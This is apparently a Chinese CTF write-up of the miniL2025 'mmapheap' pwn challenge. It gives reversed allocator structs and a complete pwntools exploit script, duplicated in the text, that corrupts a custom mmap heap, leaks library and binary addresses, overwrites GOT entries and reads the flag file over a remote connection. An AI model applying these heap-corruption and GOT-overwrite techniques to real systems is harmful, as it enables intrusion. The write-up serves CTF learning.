# miniL2025 mmapheap 题解

> 原文: https://www.ctfiot.com/253195.html
> ID: 253195

struct node_header {
void* chunk_start;     // v4[0]     → v4 + 6 usrdata起始位置
void* num;          // v4[1]   → 计数器,记录当前分配了多少个，如果归零的话，会将这个mmap页面munmap
void* base;            // v4[2]   → v4
void* end;             // v4[3]   → v4 + len
void* prev;            // v4[4]    双向链表，好像是这个是next和prev都可以，但是尾插法有点别扭，所以这里当成头插法比较符合tcache的那种插入方式
void* next;            // v4[5]
}

struct chunk {
_int64 size;
chunk* next;
userdata
}

v4[2] = v4;                                   // start_add
 v4[3] = (char *)v4 + len;                     // end
 *v4 = v4 + 6;                                 // real chunk start，指向了真正的chunk部分
 v4[1] = 0LL;                                  // 计数器归零
 v4[4] = &list_head;                           // next指针指向了head
 v4[5] = qword_4048;                           // 是直接指向了head的prev指针，
// 所以这一段其实就让新节点的prev指向了原本

from pwn import *
context(arch='amd64', log_level='debug', os='linux')
#  puts("1. Add paper");
#   puts("2. Edit paper");
#   puts("3. Delete paper");
#   puts("4. Show paper");
#   puts("5. Load paper");
def add_for(p,index,size):
    p.recvuntil(b'Choose an option:')
    p.sendline(b'1')
    p.recvuntil(b'idx: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
def add(p,index,size,data):
    p.recvuntil(b'Choose an option:')
    p.sendline(b'1')
    p.recvuntil(b'idx: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)
def delete(p, index):
    p.recvuntil(b'Choose an option:')
    p.sendline(b'3')
    p.recvuntil(b'idx: ')
    p.sendline(str(index).encode())
def edit(p, index, data):
    p.recvuntil(b'Choose an option:')
    p.sendline(b'2')
    p.recvuntil(b'idx: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'data: ')
    p.send(data)
def show(p, index):
    p.recvuntil(b'Choose an option:')
    p.sendline(b'4')
    p.recvuntil(b'idx: ')
    p.sendline(str(index).encode())
def load(p, index, filename):
    p.recvuntil(b'Choose an option:')
    p.sendline(b'5')
    p.recvuntil(b'idx: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'filename: ')
    p.send(filename)
# p = process('./vuln')
# p = gdb.debug('./vuln','b main')
p = remote('172.27.80.1',50247)
elf = ELF('./vuln')
libc = ELF('./libmylib.so')
# add(p,14,65184,b'a')
add(p,0,65440,b'a' )
# add(p,1,65200,b'a' )
add(p,1,64688,b'a' )
add(p,1,0x1f0,b'a')
add(p,14,64702,b'a')
add(p,2,0x2f0,b'b'*0x2f0)
# add(p,2,0x70,b'a'*0x70)
size = 0x300-0x20-0xd0 
# p.recvuntil(b'Choose an option:')
# p.sendline(b'2')
# p.sendline(b'2')
# p.interactive()
# p.recvuntil(b'idx: ')
# p.sendline(str(index).encode())
# p.recvuntil(b'data: ')
# p.send(data)
edit(p,1,b'a'*0x100+p64(size))
# p.interactive()
#天无绝人之路，调出来了
add(p,3,0x1e0,b'b' * 0x1d0)

add(p,4,0x10,b'a')

add_for(p,5,-1)
delete(p,4)
#此时删除掉之后，他再次覆盖回来了
show(p,5)
# p.recvuntil(b'xe0')
leak_add = u64(p.recvn(6).ljust(8,b'x00'))
print('leak_add --------------',hex(leak_add))
# add_for(p,4,-1)
libc_base = leak_add + 0x20
print('libc_base --------------',hex(libc_base))
add_of_ld = libc_base + 0x40620
#接下来只要通过修改3，就可以覆盖掉,但是问题在于，哪怕我分配过去了，他也不能泄露main的地址
#还是被隔断了
#没事可以单纯更改表，然后分配一个-1来泄露
# edit(p,3,0x1f0 * b'a' + p64(add_of_ld))
# p.interactive()

#再营造一次相同的情景
add(p,6,65440,b'a' )

add(p,7,64688,b'a' )
add(p,7,0x1f0,b'a')
add(p,14,64702,b'a')
add(p,8,0x2f0,b'b'*0x2f0)
#8通过覆盖，消除了7第一个指向的f0,变成了00，所以他会多0xf0空间
edit(p,7,b'a'*0x100+p64(0x300))
add(p,9,0x250,b'a' * 0x1f0 + p64(add_of_ld))

add_for(p,10,-1)
p.sendline(b'1')
p.recvuntil(b'idx: ')
p.sendline(b'10')
p.recvuntil(b'size: ')
# p.interactive()
p.sendline(b'-1')

show(p,10)
leak_elf_add = u64(p.recvn(6).ljust(8,b'x00'))
print('leak_elf_add --------------',hex(leak_elf_add))
elf_base = leak_elf_add - 0x340
print('elf_base --------------',hex(elf_base))
f_open_got = elf_base + elf.got['f_open']
print('f_open_got --------------',hex(f_open_got))
#直接分配更改不了，所以分配到init_libmylib
init_libmylib_got = elf_base + elf.got['init_libmylib']
print('init_libmylib_got --------------',hex(init_libmylib_got))
r_open = libc_base + libc.symbols['r_open']
print('r_open --------------',hex(r_open))

edit(p,9,0x1f0 * b'a' + p64(init_libmylib_got))
#准备填充所有函数
read_add = libc_base + libc.symbols['read']
memset_add = libc_base + libc.symbols['memset']
r_open_add = libc_base + libc.symbols['r_open']
exit_add = libc_base + libc.symbols['exit']
close_add = libc_base + libc.symbols['close']
free_add = libc_base + libc.symbols['free']
payload = p64(read_add) + p64(memset_add) + p64(r_open_add) +p64(r_open_add) + p64(exit_add) + p64(close_add) + p64(free_add)
add(p,12,0x50,payload)
load(p,2,b'flag')
show(p,2)
p.interactive()
# p = remote('172.27.80.1',62893)

看雪ID：pwnlhy

https://bbs.kanxue.com/user-home-988712.htm

*本文为看雪论坛优秀文章，由 pwnlhy 原创，转载请注明来自看雪社区

# 往期推荐

1、安卓壳学习记录（下）-某加固免费版分析

2、逆向分析：Win10 ObRegisterCallbacks的相关分析

3、VMP入门：VMP1.81 Demo分析

4、腾讯2025游戏安全PC方向初赛题解

5、OLLVM 攻略笔记

6、安卓壳学习记录（上）

球分享

球点赞

球在看

点击阅读原文查看更多


```
struct node_header {
void* chunk_start;     // v4[0]     → v4 + 6 usrdata起始位置
void* num;          // v4[1]   → 计数器,记录当前分配了多少个，如果归零的话，会将这个mmap页面munmap
void* base;            // v4[2]   → v4
void* end;             // v4[3]   → v4 + len
void* prev;            // v4[4]    双向链表，好像是这个是next和prev都可以，但是尾插法有点别扭，所以这里当成头插法比较符合tcache的那种插入方式
void* next;            // v4[5]
}
```



```
struct chunk {
_int64 size;
chunk* next;
userdata
}
```



```
v4[2] = v4;                                   // start_add
 v4[3] = (char *)v4 + len;                     // end
 *v4 = v4 + 6;                                 // real chunk start，指向了真正的chunk部分
 v4[1] = 0LL;                                  // 计数器归零
 v4[4] = &list_head;                           // next指针指向了head
 v4[5] = qword_4048;                           // 是直接指向了head的prev指针，
// 所以这一段其实就让新节点的prev指向了原本
```



```
from pwn import *
context(arch='amd64', log_level='debug', os='linux')
#  puts("1. Add paper");
#   puts("2. Edit paper");
#   puts("3. Delete paper");
#   puts("4. Show paper");
#   puts("5. Load paper");
def add_for(p,index,size):
    p.recvuntil(b'Choose an option:')
    p.sendline(b'1')
    p.recvuntil(b'idx: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
def add(p,index,size,data):
    p.recvuntil(b'Choose an option:')
    p.sendline(b'1')
    p.recvuntil(b'idx: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)
def delete(p, index):
    p.recvuntil(b'Choose an option:')
    p.sendline(b'3')
    p.recvuntil(b'idx: ')
    p.sendline(str(index).encode())
def edit(p, index, data):
    p.recvuntil(b'Choose an option:')
    p.sendline(b'2')
    p.recvuntil(b'idx: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'data: ')
    p.send(data)
def show(p, index):
    p.recvuntil(b'Choose an option:')
    p.sendline(b'4')
    p.recvuntil(b'idx: ')
    p.sendline(str(index).encode())
def load(p, index, filename):
    p.recvuntil(b'Choose an option:')
    p.sendline(b'5')
    p.recvuntil(b'idx: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'filename: ')
    p.send(filename)
# p = process('./vuln')
# p = gdb.debug('./vuln','b main')
p = remote('172.27.80.1',50247)
elf = ELF('./vuln')
libc = ELF('./libmylib.so')
# add(p,14,65184,b'a')
add(p,0,65440,b'a' )
# add(p,1,65200,b'a' )
add(p,1,64688,b'a' )
add(p,1,0x1f0,b'a')
add(p,14,64702,b'a')
add(p,2,0x2f0,b'b'*0x2f0)
# add(p,2,0x70,b'a'*0x70)
size = 0x300-0x20-0xd0 
# p.recvuntil(b'Choose an option:')
# p.sendline(b'2')
# p.sendline(b'2')
# p.interactive()
# p.recvuntil(b'idx: ')
# p.sendline(str(index).encode())
# p.recvuntil(b'data: ')
# p.send(data)
edit(p,1,b'a'*0x100+p64(size))
# p.interactive()
#天无绝人之路，调出来了
add(p,3,0x1e0,b'b' * 0x1d0)

add(p,4,0x10,b'a')

add_for(p,5,-1)
delete(p,4)
#此时删除掉之后，他再次覆盖回来了
show(p,5)
# p.recvuntil(b'xe0')
leak_add = u64(p.recvn(6).ljust(8,b'x00'))
print('leak_add --------------',hex(leak_add))
# add_for(p,4,-1)
libc_base = leak_add + 0x20
print('libc_base --------------',hex(libc_base))
add_of_ld = libc_base + 0x40620
#接下来只要通过修改3，就可以覆盖掉,但是问题在于，哪怕我分配过去了，他也不能泄露main的地址
#还是被隔断了
#没事可以单纯更改表，然后分配一个-1来泄露
# edit(p,3,0x1f0 * b'a' + p64(add_of_ld))
# p.interactive()

#再营造一次相同的情景
add(p,6,65440,b'a' )

add(p,7,64688,b'a' )
add(p,7,0x1f0,b'a')
add(p,14,64702,b'a')
add(p,8,0x2f0,b'b'*0x2f0)
#8通过覆盖，消除了7第一个指向的f0,变成了00，所以他会多0xf0空间
edit(p,7,b'a'*0x100+p64(0x300))
add(p,9,0x250,b'a' * 0x1f0 + p64(add_of_ld))

add_for(p,10,-1)
p.sendline(b'1')
p.recvuntil(b'idx: ')
p.sendline(b'10')
p.recvuntil(b'size: ')
# p.interactive()
p.sendline(b'-1')

show(p,10)
leak_elf_add = u64(p.recvn(6).ljust(8,b'x00'))
print('leak_elf_add --------------',hex(leak_elf_add))
elf_base = leak_elf_add - 0x340
print('elf_base --------------',hex(elf_base))
f_open_got = elf_base + elf.got['f_open']
print('f_open_got --------------',hex(f_open_got))
#直接分配更改不了，所以分配到init_libmylib
init_libmylib_got = elf_base + elf.got['init_libmylib']
print('init_libmylib_got --------------',hex(init_libmylib_got))
r_open = libc_base + libc.symbols['r_open']
print('r_open --------------',hex(r_open))

edit(p,9,0x1f0 * b'a' + p64(init_libmylib_got))
#准备填充所有函数
read_add = libc_base + libc.symbols['read']
memset_add = libc_base + libc.symbols['memset']
r_open_add = libc_base + libc.symbols['r_open']
exit_add = libc_base + libc.symbols['exit']
close_add = libc_base + libc.symbols['close']
free_add = libc_base + libc.symbols['free']
payload = p64(read_add) + p64(memset_add) + p64(r_open_add) +p64(r_open_add) + p64(exit_add) + p64(close_add) + p64(free_add)
add(p,12,0x50,payload)
load(p,2,b'flag')
show(p,2)
p.interactive()
# p = remote('172.27.80.1',62893)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/06/1749368622-wxsync-2025-06-cd76139353f281cf3f78625622c9bf2f.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/06/1749368624-wxsync-2025-06-37253002d43b3c62a643a1eeb6efe164.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/06/1749368628-wxsync-2025-06-71612baea187590d75a96ee2368782fc.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/06/1749368630-wxsync-2025-06-d2ca368f75092f5eee67f5eec75b95e9.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/06/1749368632-wxsync-2025-06-d2ca368f75092f5eee67f5eec75b95e9.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/06/1749368635-wxsync-2025-06-d2ca368f75092f5eee67f5eec75b95e9.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/06/1749368637-wxsync-2025-06-f3a6e530b80ade00f97deed30f426eb6.gif)